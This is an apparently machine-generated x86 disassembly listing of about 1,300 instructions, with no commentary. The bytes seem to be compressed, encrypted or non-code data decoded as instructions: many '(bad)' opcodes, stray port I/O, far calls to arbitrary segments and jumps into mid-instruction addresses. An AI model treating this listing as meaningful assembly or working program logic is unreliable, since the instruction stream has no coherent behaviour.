  410347:	and    BYTE PTR [esi],cl
  410349:	ja     0x4102d1
  41034b:	xor    al,0x9
  41034d:	dec    esi
  41034e:	inc    eax
  41034f:	out    0x2b,eax
  410351:	clc    
  410352:	sbb    eax,0x58c56f07
  410357:	xchg   esp,eax
  410358:	jg     0x41039c
  41035a:	gs mov dl,0xcc
  41035d:	ret    
  41035e:	mov    al,0xd2
  410360:	cmp    al,0x2b
  410362:	dec    edx
  410363:	ret    
  410364:	out    0x56,al
  410366:	jle    0x4102e9
  410368:	mov    eax,0x68e4c6a8
  41036d:	mov    esp,edi
  41036f:	mov    bh,0x10
  410371:	leave  
  410372:	in     eax,dx
  410373:	push   ebx
  410374:	jp     0x41039c
  410376:	jg     0x4103a0
  410378:	and    eax,0xee72bbcc
  41037d:	pop    ds
  41037e:	outs   dx,DWORD PTR ds:[esi]
  41037f:	push   esi
  410380:	aad    0xc4
  410382:	pop    ecx
  410383:	aam    0x7d
  410385:	push   esp
  410386:	and    bh,BYTE PTR [eax-0x309da985]
  41038c:	and    bh,BYTE PTR [edx-0x71]
  41038f:	add    al,0x13
  410391:	test   DWORD PTR [edi+0x1c6d5170],esi
  410397:	repz sti 
  410399:	xchg   ch,bh
  41039b:	cmp    eax,DWORD PTR [esi]
  41039d:	jne    0x4103b3
  41039f:	xchg   ebp,eax
  4103a0:	pushf  
  4103a1:	fldenv [ecx+esi*1+0x6d]
  4103a5:	and    eax,ecx
  4103a7:	(bad)  
  4103a8:	loopne 0x410420
  4103aa:	mov    ds:0x6c0304,al
  4103af:	and    ecx,DWORD PTR [ecx+edx*4]
  4103b2:	aas    
  4103b3:	mov    ecx,0xa4250113
  4103b8:	push   esi
  4103b9:	cmc    
  4103ba:	into   
  4103bb:	dec    edi
  4103bc:	mov    cl,0xd4
  4103be:	imul   esi,DWORD PTR [ebx],0xffffff99
  4103c1:	xchg   BYTE PTR [ecx+edi*1-0x91711b8],ch
  4103c8:	jne    0x4103ec
  4103ca:	adc    BYTE PTR [edx-0x62fb9940],al
  4103d0:	xchg   ecx,eax
  4103d1:	or     eax,0x9ace67af
  4103d6:	sahf   
  4103d7:	xchg   BYTE PTR [ecx-0x2beefa28],bl
  4103dd:	pop    ecx
  4103de:	or     DWORD PTR [edi+0x47],edx
  4103e1:	mov    WORD PTR [ebx],es
  4103e3:	xor    BYTE PTR [esi],al
  4103e5:	enter  0x1083,0x94
  4103e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103ea:	ja     0x410401
  4103ec:	pop    edi
  4103ed:	mov    ebx,0x6355d296
  4103f2:	jns    0x410394
  4103f4:	ja     0x4103d1
  4103f6:	or     al,0x1b
  4103f8:	call   0xc80f:0x6ed871d
  4103ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410400:	gs push esp
  410402:	rol    DWORD PTR [ecx-0x4cf64bf6],0x5e
  410409:	push   esi
  41040a:	xor    bl,BYTE PTR [edi]
  41040c:	or     bl,BYTE PTR [edx+0x1ce4eafc]
  410412:	pop    ecx
  410413:	push   edx
  410414:	cs xor eax,0xfefbc962
  41041a:	jmp    ecx
  41041c:	fs dec eax
  41041e:	jo     0x41041a
  410420:	dec    esi
  410421:	xchg   esi,eax
  410422:	arpl   di,bx
  410424:	mov    edx,0x98bcfab5
  410429:	or     eax,0xead1c928
  41042e:	mov    BYTE PTR [eax+0x33c98675],ah
  410434:	and    DWORD PTR [edx],eax
  410436:	add    DWORD PTR [ecx-0x54d91245],ebp
  41043c:	arpl   WORD PTR [ebx-0x5f570fc9],bp
  410442:	(bad)  
  410443:	mov    ebx,0xc91ef42
  410448:	fisttp DWORD PTR [eax-0x2caff0bb]
  41044e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41044f:	xchg   BYTE PTR [ecx],bl
  410451:	inc    esp
  410453:	ja     0x41047e
  410455:	jecxz  0x4103fd
  410457:	sub    eax,0xe4b14bca
  41045c:	mov    al,0x51
  41045e:	jmp    0xc260:0x3d6a6ecd
  410465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410466:	sub    eax,0x5ff0432b
  41046b:	xor    WORD PTR [edi],di
  41046e:	mov    esp,0x5b913bfe
  410473:	leave  
  410474:	pop    ecx
  410475:	out    0x91,eax
  410477:	fcmovnb st,st(0)
  410479:	jmp    0x41046d
  41047b:	cs jmp 0x58758e02
  410481:	jl     0x410448
  410483:	adc    al,0xa4
  410485:	sub    BYTE PTR [ebx],al
  410487:	mov    ah,0x23
  410489:	lods   al,BYTE PTR ds:[esi]
  41048a:	nop
  41048b:	mov    cl,0x89
  41048d:	lods   eax,DWORD PTR ds:[esi]
  41048e:	into   
  41048f:	popa   
  410490:	bnd call 0xed3861a1
  410496:	mov    al,ds:0xd3b7d1f5
  41049b:	je     0x410453
  41049d:	xchg   edx,eax
  41049e:	call   0x5b08:0xcc4f1abe
  4104a5:	pop    ebx
  4104a6:	mov    esi,0x8986b4a6
  4104ab:	cmp    BYTE PTR [edx],al
  4104ad:	xsavec [esi+0xd0fbba7]
  4104b4:	mov    al,cl
  4104b6:	push   ss
  4104b7:	out    0x47,al
  4104b9:	data16 jl 0x4104bb
  4104bc:	data16 jle 0x4104d0
  4104bf:	xor    esi,DWORD PTR [esi+0x72a13ebd]
  4104c5:	xor    BYTE PTR ds:0x628b4121,dh
  4104cb:	jnp    0x4104a1
  4104cd:	js     0x4104c6
  4104cf:	dec    ebp
  4104d0:	cld    
  4104d1:	push   ebp
  4104d2:	dec    esi
  4104d3:	stos   BYTE PTR es:[di],al
  4104d5:	gs sahf 
  4104d7:	sbb    esi,DWORD PTR [ebx+0x69]
  4104da:	bound  ebp,QWORD PTR [esi]
  4104dc:	cmc    
  4104dd:	pop    esi
  4104de:	in     eax,0x5
  4104e0:	xchg   eax,ebx
  4104e2:	jne    0x4104cb
  4104e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e5:	repnz sub BYTE PTR [esi],bl
  4104e8:	js     0x410499
  4104ea:	pushf  
  4104eb:	shl    BYTE PTR [ecx],cl
  4104ed:	jl     0x4104fe
  4104ef:	idiv   BYTE PTR [esi+0x1d282e12]
  4104f5:	test   cl,ah
  4104f7:	(bad)  
  4104f8:	fmul   st(4),st
  4104fa:	into   
  4104fb:	push   esi
  4104fc:	shl    DWORD PTR [ecx-0x39],0x22
  410500:	int3   
  410501:	ja     0x4104ff
  410503:	ja     0x410527
  410505:	add    eax,0x628ee6fe
  41050a:	push   cs
  41050b:	cmp    al,0xba
  41050d:	nop
  41050e:	mov    gs,esi
  410510:	cs daa 
  410512:	out    dx,eax
  410513:	inc    esi
  410514:	aaa    
  410515:	pop    fs
  410517:	popf   
  410518:	mov    ds:0x152221,al
  41051d:	mov    ch,0x3c
  41051f:	dec    edx
  410520:	adc    ecx,DWORD PTR [ebp+0xd]
  410523:	cdq    
  410524:	push   eax
  410525:	dec    ebp
  410526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410527:	rol    DWORD PTR [ebp-0x38],0xe
  41052b:	and    edi,DWORD PTR [esi]
  41052d:	stc    
  41052e:	call   0xd027:0x9ee6658c
  410535:	ins    DWORD PTR es:[edi],dx
  410536:	rcr    cl,cl
  410538:	test   DWORD PTR [eax+ecx*1],esi
  41053b:	dec    edi
  41053c:	sub    eax,0x8aab6cd9
  410541:	sti    
  410542:	ins    DWORD PTR es:[edi],dx
  410543:	xchg   BYTE PTR [ecx+0x538f81f1],dh
  410549:	and    DWORD PTR [ebx-0x66ca643e],ebp
  41054f:	cmp    BYTE PTR [edx],0x46
  410552:	bound  ebp,QWORD PTR [esp+edx*2-0x3e1f9662]
  410559:	xor    eax,0xa02f54ef
  41055e:	jo     0x41054a
  410560:	call   0x14be476b
  410565:	mov    ecx,0x5cb2af7b
  41056a:	inc    ebx
  41056b:	and    al,0x6a
  41056d:	dec    edi
  41056e:	ds sub eax,0x3913b4cc
  410574:	mov    edx,eax
  410576:	loope  0x4105f5
  410578:	or     BYTE PTR [ecx-0x1e],0x48
  41057c:	cmc    
  41057d:	ss or  bh,ah
  410580:	sar    DWORD PTR [ecx],0x40
  410583:	inc    edi
  410584:	and    al,BYTE PTR [ecx+eiz*2]
  410587:	push   0x10
  410589:	in     eax,0x3e
  41058b:	dec    ebp
  41058c:	and    DWORD PTR gs:[edi-0x1d],esi
  410590:	or     al,0x5c
  410592:	iret   
  410593:	xchg   DWORD PTR [edx-0x8],edi
  410596:	jecxz  0x4105ad
  410598:	popa   
  410599:	sbb    ebp,DWORD PTR gs:[ebx-0x7a]
  41059d:	mov    WORD PTR [eax],cs
  41059f:	push   edx
  4105a0:	mov    ds:0x2dfab3d0,al
  4105a5:	sti    
  4105a6:	fnclex 
  4105a8:	(bad)  
  4105a9:	fbld   TBYTE PTR [ebx]
  4105ab:	jnp    0x4105c3
  4105ad:	sbb    bl,BYTE PTR [edi]
  4105af:	jae    0x41054f
  4105b1:	push   ebx
  4105b2:	push   esi
  4105b3:	push   edi
  4105b4:	out    dx,al
  4105b5:	dec    esi
  4105b6:	push   ebp
  4105b7:	push   ss
  4105b8:	and    eax,0x6677efec
  4105bd:	iret   
  4105be:	outs   dx,BYTE PTR ds:[esi]
  4105bf:	fidivr WORD PTR [ebp+0x7163d075]
  4105c5:	dec    esi
  4105c6:	sub    edx,edx
  4105c8:	inc    edi
  4105c9:	jns    0x41055d
  4105cb:	pop    edi
  4105cc:	push   0x5d1b3f4f
  4105d1:	iret   
  4105d2:	int    0x42
  4105d4:	mov    ah,0xb2
  4105d6:	xor    DWORD PTR cs:[ebx],edi
  4105d9:	loopne 0x410581
  4105db:	into   
  4105dc:	pop    cx
  4105de:	jp     0x410621
  4105e0:	das    
  4105e1:	jbe    0x41065d
  4105e3:	pop    eax
  4105e4:	ja     0x410595
  4105e6:	adc    dl,BYTE PTR [eax-0x6e5afb25]
  4105ec:	mov    ebp,0xe068e21d
  4105f1:	bswap  edx
  4105f3:	hlt    
  4105f4:	add    dh,al
  4105f6:	mov    ah,0x81
  4105f8:	sub    bh,BYTE PTR [edx-0x50]
  4105fb:	fdivr  QWORD PTR [esi]
  4105fd:	or     dh,BYTE PTR [edx+0x541ca83e]
  410603:	(bad)  
  410604:	fild   QWORD PTR [edi]
  410606:	jl     0x4105a4
  410608:	jmp    0x4105b9
  41060a:	ficom  DWORD PTR [esi-0x63cf1c59]
  410610:	jbe    0x4105b9
  410612:	ss pop edi
  410614:	jne    0x4105e1
  410616:	bound  ebp,QWORD PTR [ecx]
  410618:	cli    
  410619:	test   eax,0xccf5b897
  41061e:	ins    BYTE PTR es:[edi],dx
  41061f:	dec    eax
  410620:	fldln2 
  410622:	scas   eax,DWORD PTR es:[edi]
  410623:	adc    BYTE PTR [edx+0x70],ah
  410626:	sub    al,0x45
  410628:	ins    DWORD PTR es:[edi],dx
  410629:	push   edi
  41062a:	add    BYTE PTR [esi+0x58],cl
  41062d:	imul   ebx,DWORD PTR [esi+ebp*1],0x84f7ccae
  410634:	out    0xe0,eax
  410636:	jne    0x4105c8
  410638:	xor    dl,bh
  41063a:	mov    cl,0xd4
  41063c:	push   es
  41063d:	gs sbb eax,edi
  410640:	mov    ah,0x92
  410642:	sub    al,0x9c
  410644:	xor    dh,al
  410646:	pop    esp
  410647:	jb     0x41067b
  410649:	leave  
  41064a:	push   0xffffffac
  41064c:	sub    esp,esp
  41064e:	cmp    bh,dh
  410650:	xor    BYTE PTR ds:0x44b05eff,bl
  410656:	les    esi,FWORD PTR [ecx-0x5b1abf1c]
  41065c:	ins    DWORD PTR es:[edi],dx
  41065d:	ror    ecx,1
  41065f:	inc    ebp
  410660:	pop    ecx
  410661:	xchg   edi,eax
  410662:	(bad)  
  410663:	jecxz  0x4105f1
  410665:	ds loope 0x410651
  410668:	xchg   DWORD PTR [esi],esp
  41066a:	add    esp,DWORD PTR [edi+0x54231834]
  410670:	pop    edi
  410671:	cdq    
  410672:	stos   BYTE PTR es:[edi],al
  410673:	mov    dl,0x15
  410675:	ja     0x410647
  410677:	jmp    0x4106b8
  410679:	add    al,0x8e
  41067b:	xor    al,0x28
  41067d:	(bad)  
  41067e:	xor    eax,0x9e6df43
  410683:	add    ch,BYTE PTR [ebx+eax*8]
  410686:	out    0x3d,al
  410688:	xor    esp,DWORD PTR [edx+ebx*4-0x577f5491]
  41068f:	xchg   ebp,eax
  410690:	ins    BYTE PTR es:[edi],dx
  410691:	das    
  410692:	inc    edi
  410693:	fdivr  st(4),st
  410695:	mov    es,WORD PTR [ecx+eiz*2+0x3d]
  410699:	push   edi
  41069a:	mov    al,BYTE PTR [edx]
  41069c:	int3   
  41069d:	xor    dh,BYTE PTR [edi+0x3289de3a]
  4106a3:	inc    edi
  4106a4:	push   ebx
  4106a5:	sahf   
  4106a6:	pop    es
  4106a7:	aam    0xf9
  4106a9:	gs push 0x68
  4106ac:	mov    edi,DWORD PTR [esi]
  4106ae:	test   DWORD PTR [edx+esi*2-0x27],esi
  4106b2:	pushf  
  4106b3:	fcom   DWORD PTR [edi]
  4106b5:	sbb    eax,0xdaa2d223
  4106ba:	push   esp
  4106bb:	pop    esi
  4106bc:	mov    eax,ds:0xcbd0cd6d
  4106c1:	push   ss
  4106c2:	aam    0x11
  4106c4:	ret    0xe16a
  4106c7:	addr16 xchg eax,ecx
  4106ca:	out    0xd3,al
  4106cc:	jge    0x410741
  4106ce:	cmp    bh,BYTE PTR [esi-0x3e3e502c]
  4106d4:	dec    esp
  4106d5:	data16 lods al,BYTE PTR ds:[esi]
  4106d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106d8:	adc    DWORD PTR [eax*4+0x6691f666],ebx
  4106df:	pop    es
  4106e0:	mov    ch,0x92
  4106e2:	push   cs
  4106e3:	(bad)  
  4106e4:	adc    ecx,DWORD PTR [edi+esi*8-0x74cf58e]
  4106eb:	mov    ch,BYTE PTR ds:0x22a7c30b
  4106f1:	mov    ebp,0xd4cbbd1d
  4106f6:	add    bl,0xe4
  4106f9:	jmp    eax
  4106fb:	retf   
  4106fc:	cld    
  4106fd:	xlat   BYTE PTR ds:[ebx]
  4106fe:	xchg   esi,ebp
  410700:	mov    WORD PTR [ecx-0x7516859b],?
  410706:	xchg   esp,eax
  410707:	sub    BYTE PTR [ebx+eax*1],ah
  41070a:	and    dl,BYTE PTR [ebp+0x5bf3c0be]
  410710:	call   0x1e7b:0x1197de3b
  410717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410718:	or     cl,BYTE PTR [eax-0x71cf0210]
  41071e:	cmp    DWORD PTR cs:[esi+0x188c8b01],esi
  410725:	repnz loopne 0x410708
  410728:	ret    0x928a
  41072b:	cmp    al,0x3f
  41072d:	mov    ebp,0xe084ebcc
  410732:	test   al,0x51
  410734:	mov    ds:0x9a41c688,eax
  410739:	push   edx
  41073a:	mov    bl,0x19
  41073c:	push   esi
  41073d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41073f:	in     al,dx
  410740:	xchg   BYTE PTR [edi+esi*1+0x7c55af75],bl
  410747:	pop    edx
  410748:	jmp    0x312a3bf0
  41074d:	add    eax,0xfc3d52f2
  410752:	push   edi
  410753:	sub    esp,DWORD PTR [ecx+0x69bb04b9]
  410759:	cwde   
  41075a:	jnp    0x41071a
  41075c:	jmp    0x410788
  41075e:	cmp    DWORD PTR [edi-0x2d964858],0x55ceedc1
  410768:	xor    BYTE PTR [ecx],dh
  41076a:	inc    eax
  41076b:	leave  
  41076c:	jnp    0x410756
  41076e:	dec    ebp
  41076f:	aaa    
  410770:	jecxz  0x410705
  410772:	push   ebx
  410773:	clc    
  410774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410775:	mov    eax,ds:0x4d5b3c20
  41077a:	clc    
  41077b:	cmp    ebp,DWORD PTR [ebx+0x69]
  41077e:	jl     0x41073d
  410780:	popa   
  410781:	lock sub BYTE PTR [edi-0x29b1bf2f],bl
  410788:	lahf   
  410789:	mov    eax,gs
  41078b:	jnp    0x410746
  41078d:	mov    eax,ds:0xb667d1fc
  410792:	shr    BYTE PTR [ebx-0x7a],cl
  410795:	out    dx,al
  410796:	out    0xfd,al
  410798:	cmp    eax,0x78710674
  41079d:	pop    edx
  41079e:	call   0x4a88d080
  4107a3:	inc    ebx
  4107a4:	mov    ebp,0xa4e1bd56
  4107a9:	mov    eax,DWORD PTR [esi]
  4107ab:	cmp    ecx,DWORD PTR ds:0x85ecc06f
  4107b1:	jl     0x4107ac
  4107b3:	adc    DWORD PTR [ebp+ebp*8+0x4b],ecx
  4107b7:	rcl    BYTE PTR [ebp-0x56],0xb0
  4107bb:	cld    
  4107bc:	pop    esi
  4107bd:	popa   
  4107be:	loop   0x41075c
  4107c0:	fcmovnb st,st(6)
  4107c2:	sahf   
  4107c3:	jg     0x4107bd
  4107c5:	xchg   bh,cl
  4107c7:	xchg   ecx,eax
  4107c8:	mov    ds:0x4c21afbd,eax
  4107cd:	sub    al,0x7c
  4107cf:	sub    ecx,edi
  4107d1:	push   es
  4107d2:	mov    al,BYTE PTR [ebp+eax*4-0x2811fa99]
  4107d9:	in     al,dx
  4107da:	ret    
  4107db:	push   es
  4107dc:	push   cs
  4107dd:	push   edi
  4107de:	jne    0x4107c6
  4107e0:	dec    ebp
  4107e1:	or     DWORD PTR [ecx],0xd0ae3e70
  4107e7:	pop    ebp
  4107e8:	jle    0x4107fa
  4107ea:	aaa    
  4107eb:	lock popa 
  4107ed:	mov    edi,DWORD PTR [edi-0x711d5c1a]
  4107f3:	aam    0x23
  4107f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107f6:	iret   
  4107f7:	sar    BYTE PTR [eax-0x3f],0xe1
  4107fb:	pop    ecx
  4107fc:	and    eax,0xd73ff74f
  410801:	ret    
  410802:	bound  edx,QWORD PTR [ebx-0x65f176a1]
  410808:	xchg   edi,eax
  410809:	jnp    0x41083b
  41080b:	cdq    
  41080c:	pushf  
  41080d:	pusha  
  41080e:	call   0x882:0xb67e6b86
  410815:	std    
  410816:	inc    edx
  410817:	cdq    
  410818:	retf   
  410819:	out    0xa0,eax
  41081b:	jg     0x41083b
  41081d:	cmp    bl,BYTE PTR [ebp+0x229404ab]
  410823:	jecxz  0x4108a0
  410825:	repz lock int 0xf0
  410829:	or     al,0x6b
  41082b:	push   es
  41082c:	or     BYTE PTR [ebx-0x5a],al
  41082f:	ror    BYTE PTR [edi-0x1f02dd92],1
  410835:	arpl   WORD PTR [ebx],si
  410837:	je     0x41084d
  410839:	pop    ecx
  41083a:	xchg   ebp,eax
  41083b:	ins    BYTE PTR es:[edi],dx
  41083c:	adc    DWORD PTR [ecx-0x1c261c5e],eax
  410842:	xor    al,0x7c
  410844:	fisttp QWORD PTR [edi-0x7e]
  410847:	lods   eax,DWORD PTR ds:[esi]
  410848:	retf   0x8103
  41084b:	mov    DWORD PTR [ecx],esi
  41084d:	or     BYTE PTR [edx+ecx*4-0x7b],dh
  410851:	stos   DWORD PTR es:[edi],eax
  410852:	adc    eax,0xd4a66bc3
  410857:	ret    
  410858:	jae    0x41082b
  41085a:	fcomip st,st(6)
  41085c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41085d:	jle    0x4108dd
  41085f:	and    eax,eax
  410861:	adc    al,0x18
  410863:	fimul  DWORD PTR [ecx-0x1ef09cc1]
  410869:	icebp  
  41086a:	(bad)  
  41086b:	fcom   DWORD PTR [edx-0x35485ac3]
  410871:	adc    bl,BYTE PTR [edx+0x1a]
  410874:	xor    bh,BYTE PTR [ecx]
  410876:	int    0xd9
  410878:	imul   edi,DWORD PTR [edi-0x18cb74a4],0xed237cda
  410882:	scas   eax,DWORD PTR es:[edi]
  410883:	or     al,0x65
  410885:	xchg   ecx,eax
  410886:	jle    0x41088d
  410888:	cld    
  410889:	(bad)  
  41088a:	push   ecx
  41088b:	inc    eax
  41088c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41088d:	pop    ebp
  41088e:	popa   
  41088f:	push   es
  410890:	rcl    BYTE PTR [eax-0x40f81421],cl
  410896:	ins    DWORD PTR es:[edi],dx
  410897:	add    eax,ebx
  410899:	inc    esp
  41089a:	in     al,0x4a
  41089c:	sar    DWORD PTR [edx],0xcc
  41089f:	pusha  
  4108a0:	popf   
  4108a1:	pop    ebp
  4108a2:	arpl   WORD PTR [edx-0x3],ax
  4108a5:	or     al,0x54
  4108a7:	int3   
  4108a8:	pop    edi
  4108a9:	add    eax,0xbad8b70f
  4108ae:	mov    DWORD PTR [edi],edi
  4108b0:	push   eax
  4108b1:	shl    DWORD PTR [ebx],1
  4108b3:	fidiv  DWORD PTR [ecx+0x6d]
  4108b6:	popf   
  4108b7:	cld    
  4108b8:	xchg   ebp,eax
  4108b9:	sub    edx,DWORD PTR [esi+0xc]
  4108bc:	outs   dx,BYTE PTR ds:[esi]
  4108bd:	(bad)  
  4108be:	clc    
  4108bf:	push   0x847e1282
  4108c4:	push   es
  4108c5:	imul   edx,esi,0x37a0e192
  4108cb:	js     0x41085e
  4108cd:	js     0x410916
  4108cf:	shl    DWORD PTR [ebp-0x10],cl
  4108d2:	add    eax,0x54f9072e
  4108d7:	aas    
  4108d8:	mov    es,WORD PTR [ecx]
  4108da:	in     al,dx
  4108db:	dec    ecx
  4108dc:	enter  0x3214,0x45
  4108e0:	sbb    al,0xad
  4108e2:	mov    esi,0x545de5e8
  4108e7:	div    DWORD PTR [esi]
  4108e9:	out    dx,al
  4108ea:	(bad)  
  4108eb:	fcom   DWORD PTR [edx-0x51]
  4108ee:	mov    DWORD PTR [esi-0x46],eax
  4108f1:	push   esp
  4108f2:	push   ss
  4108f3:	mov    eax,ds:0xa9920ba0
  4108f8:	(bad)  
  4108f9:	stc    
  4108fa:	mov    ds:0x92e77462,eax
  4108ff:	jne    0x410966
  410901:	call   0xf6a9eb39
  410906:	out    dx,al
  410907:	dec    edx
  410908:	fisub  WORD PTR [ebp-0x233f5ced]
  41090e:	or     al,0xa4
  410910:	dec    esi
  410911:	in     eax,0xb5
  410913:	rol    DWORD PTR [eax+0xe4657ec],0x8d
  41091a:	int3   
  41091b:	call   DWORD PTR [edi-0x16dc21e9]
  410921:	xor    cl,BYTE PTR [ecx+0x6136a226]
  410927:	loopne 0x410910
  410929:	jle    0x410901
  41092b:	xlat   BYTE PTR ds:[ebx]
  41092c:	push   ss
  41092d:	inc    edx
  41092e:	stos   BYTE PTR es:[edi],al
  41092f:	inc    edi
  410930:	cmp    al,0xf5
  410932:	pop    ds
  410933:	adc    esp,edx
  410935:	dec    esi
  410936:	xchg   ecx,eax
  410937:	xchg   edx,eax
  410938:	cmp    al,BYTE PTR [esi+0x4b381b46]
  41093e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41093f:	mov    esi,0x974d10fc
  410944:	jl     0x410908
  410946:	das    
  410947:	pusha  
  410948:	cmc    
  410949:	lea    eax,[edi+0x4fbd6644]
  41094f:	fsubr  st,st(7)
  410951:	sub    DWORD PTR [edx],ecx
  410953:	mov    ds:0xf7623436,al
  410958:	inc    edi
  410959:	dec    ecx
  41095a:	xchg   ecx,eax
  41095b:	mov    DWORD PTR [ecx+0x4f],ebx
  41095e:	ins    DWORD PTR es:[edi],dx
  41095f:	int3   
  410960:	dec    edi
  410961:	aaa    
  410962:	xchg   ecx,eax
  410963:	push   edi
  410964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410965:	enter  0xc234,0x46
  410969:	nop
  41096a:	mov    WORD PTR [esi+0xa],ss
  41096d:	(bad)  
  41096e:	sub    BYTE PTR [edx],dh
  410970:	sbb    esp,DWORD PTR [esi-0x30]
  410973:	jmp    0xe3ab52f6
  410978:	mov    edx,0xdbc47135
  41097d:	dec    eax
  41097e:	ds pop esi
  410980:	sub    eax,0xc177e9a3
  410985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410986:	inc    edi
  410987:	adc    eax,0x655d9a4f
  41098c:	out    0x98,eax
  41098e:	out    dx,al
  41098f:	popa   
  410990:	lea    edi,[ebp-0x22f10af9]
  410996:	add    al,0x67
  410998:	push   ecx
  410999:	push   0x8f58d19c
  41099e:	pop    eax
  41099f:	out    0xe5,al
  4109a1:	push   cs
  4109a2:	(bad)  
  4109a3:	(bad)  [ebp+0x727d2d75]
  4109a9:	push   ebx
  4109aa:	mov    esp,0xe5aeacec
  4109af:	lock call esp
  4109b2:	test   cl,bh
  4109b4:	push   0xfdd04649
  4109b9:	push   ebx
  4109ba:	into   
  4109bb:	dec    edx
  4109bc:	inc    esp
  4109bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109be:	bound  edx,QWORD PTR [eax-0x72]
  4109c1:	adc    DWORD PTR [esi+0x70],ebx
  4109c4:	nop
  4109c5:	sahf   
  4109c6:	jmp    0xf628:0x63423ccb
  4109cd:	xlat   BYTE PTR ds:[ebx]
  4109ce:	movlps QWORD PTR ss:[edi+0x37],xmm6
  4109d3:	push   ecx
  4109d4:	jmp    0x83deca14
  4109d9:	push   ss
  4109da:	pop    ebp
  4109db:	adc    al,0x45
  4109dd:	rcl    dh,cl
  4109df:	stos   BYTE PTR es:[edi],al
  4109e0:	loopne 0x4109b9
  4109e2:	aas    
  4109e3:	pop    es
  4109e4:	adc    cl,ah
  4109e6:	ror    DWORD PTR [eax+0x3d],1
  4109e9:	push   cs
  4109ea:	adc    dl,dl
  4109ec:	xchg   ecx,eax
  4109ed:	dec    edi
  4109ee:	push   ebp
  4109ef:	mov    ds:0x84c83877,al
  4109f4:	daa    
  4109f5:	sub    al,0x41
  4109f7:	lahf   
  4109f8:	adc    BYTE PTR ds:0xf919e0f0,bl
  4109fe:	xchg   BYTE PTR [eax-0x57cff554],cl
  410a04:	lock ror al,1
  410a07:	push   eax
  410a08:	das    
  410a09:	mov    eax,0x6c1a7703
  410a0e:	jno    0x410a8e
  410a10:	shr    DWORD PTR [esi],1
  410a12:	stos   BYTE PTR es:[edi],al
  410a13:	pop    eax
  410a14:	retf   
  410a15:	cdq    
  410a16:	inc    eax
  410a17:	pop    ss
  410a18:	hlt    
  410a19:	mov    edx,0x7f1e78cf
  410a1e:	std    
  410a1f:	je     0x410a38
  410a21:	stos   DWORD PTR es:[edi],eax
  410a22:	sbb    eax,0x4a56a037
  410a27:	aam    0x17
  410a29:	sub    ah,BYTE PTR [ebx+ecx*8+0x57]
  410a2d:	push   0x1f
  410a2f:	ja     0x410a63
  410a31:	mov    esi,0x2cc41bb8
  410a36:	mov    al,ds:0xcc2a01c9
  410a3b:	add    al,0x6
  410a3d:	call   0x6b777b5d
  410a42:	cs cs push es
  410a45:	shr    DWORD PTR [ecx-0x43],0xb7
  410a49:	lock add al,0x90
  410a4c:	pop    es
  410a4d:	frstor [esi-0x76]
  410a50:	sbb    cl,BYTE PTR [eax+0x797e653e]
  410a56:	fwait
  410a57:	icebp  
  410a58:	mov    ah,0xcf
  410a5a:	loopne 0x410a66
  410a5c:	pop    esp
  410a5d:	sub    ah,BYTE PTR [esi+ecx*1]
  410a60:	jnp    0x4109ec
  410a62:	in     eax,0x84
  410a64:	in     al,0x6c
  410a66:	out    dx,al
  410a67:	aad    0xa9
  410a69:	jge    0x410a09
  410a6b:	inc    eax
  410a6c:	push   ecx
  410a6d:	and    BYTE PTR [eax],al
  410a6f:	ficom  WORD PTR ds:[edx+0x19b148ce]
  410a76:	fbstp  TBYTE PTR [ecx+0x71]
  410a79:	and    DWORD PTR [ebx],eax
  410a7b:	fs nop
  410a7d:	stc    
  410a7e:	push   cs
  410a7f:	or     eax,DWORD PTR [ebp-0x6fd96884]
  410a85:	adc    esi,DWORD PTR [edi+ebp*2+0x550fb28a]
  410a8c:	pop    ebx
  410a8d:	xchg   edi,ecx
  410a8f:	xchg   BYTE PTR [eax+0x5ec62198],dh
  410a95:	inc    ecx
  410a96:	dec    esp
  410a97:	clc    
  410a98:	loope  0x410a54
  410a9a:	retf   
  410a9b:	rcl    DWORD PTR [edi+ebp*4-0x5f],cl
  410a9f:	xchg   DWORD PTR [ebx+0x3d9ce6c8],ecx
  410aa5:	add    al,0xcd
  410aa7:	out    dx,eax
  410aa8:	xchg   edi,eax
  410aa9:	data16 sbb BYTE PTR [eax+ebx*1-0x68f2e954],cl
  410ab1:	jae    0x410b2b
  410ab3:	mov    al,ch
  410ab5:	xor    BYTE PTR ds:0x519834ff,dl
  410abb:	cdq    
  410abc:	sbb    eax,eax
  410abe:	cmp    ah,al
  410ac0:	push   0x7f
  410ac2:	shr    ah,0xbb
  410ac5:	sub    al,0xea
  410ac7:	stos   DWORD PTR es:[edi],eax
  410ac8:	sahf   
  410ac9:	push   esp
  410aca:	scas   al,BYTE PTR es:[edi]
  410acb:	icebp  
  410acc:	jae    0x410abe
  410ace:	(bad)  
  410acf:	mov    esi,0x3279474b
  410ad4:	pop    ebp
  410ad5:	data16 and ch,cl
  410ad8:	xor    eax,0xecb6baa4
  410add:	pop    esi
  410ade:	pop    es
  410adf:	or     DWORD PTR [ecx+0x1f4c88fe],ebp
  410ae5:	loope  0x410b3e
  410ae7:	adc    ebx,0xaacaa0f9
  410aed:	in     eax,0x8a
  410aef:	xchg   DWORD PTR [ebp+0x18],esi
  410af2:	xchg   ebx,eax
  410af3:	dec    BYTE PTR [ecx]
  410af5:	or     bh,BYTE PTR [ebp-0xd]
  410af8:	mov    ebx,0xb95d461e
  410afd:	mov    bl,0x3f
  410aff:	lahf   
  410b00:	ins    DWORD PTR es:[edi],dx
  410b01:	add    al,0xa5
  410b03:	jl     0x410aa8
  410b05:	call   0xb747:0x6e6dc5e6
  410b0c:	xor    DWORD PTR [ebx-0x798c527e],esp
  410b12:	adc    dh,ah
